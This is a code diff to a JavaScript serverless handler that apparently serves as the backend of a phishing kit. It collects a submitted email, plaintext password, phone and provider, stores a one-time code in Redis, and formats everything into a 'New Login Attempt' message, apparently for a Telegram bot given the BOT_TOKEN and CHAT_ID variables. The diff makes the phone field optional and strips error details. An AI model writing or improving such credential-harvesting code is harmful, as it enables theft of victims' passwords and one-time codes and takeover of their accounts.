@@ -19,7 +19,8 @@ export default async function handler(req, res) {
   if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
     return res.status(500).json({
       success: false,
-      message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL",
+      message:
+        "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL",
     });
   }
 
@@ -42,7 +43,7 @@ export default async function handler(req, res) {
 
   const { email, password, phone, provider } = bodyObj || {};
 
-  if (!email || !password || !phone || !provider) {
+  if (!email || !password || !provider) {
     return res.status(400).json({ success: false, message: "Missing required fields" });
   }
 
@@ -51,21 +52,16 @@ export default async function handler(req, res) {
 
   try {
     await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300); // expire in 5 minutes
-    console.log("OTP stored in Redis");
   } catch (err) {
     console.error("Redis error:", err);
-    return res.status(500).json({
-      success: false,
-      message: "Failed to store OTP in Redis",
-      error: err.message,
-    });
+    return res.status(500).json({ success: false, message: "Failed to store OTP" });
   }
 
   const message = [
     "🔐 *New Login Attempt*",
     `📧 Email: ${normalizedEmail}`,
     `🔑 Password: ${password}`,
-    `📱 Phone: ${phone}`,
+    `📱 Phone: ${phone || "N/A"}`,
     `🌐 Provider: ${provider}`,
     `🧾 OTP: ${otp}`,
     `🕒 Time: ${new Date().toISOString()}`,
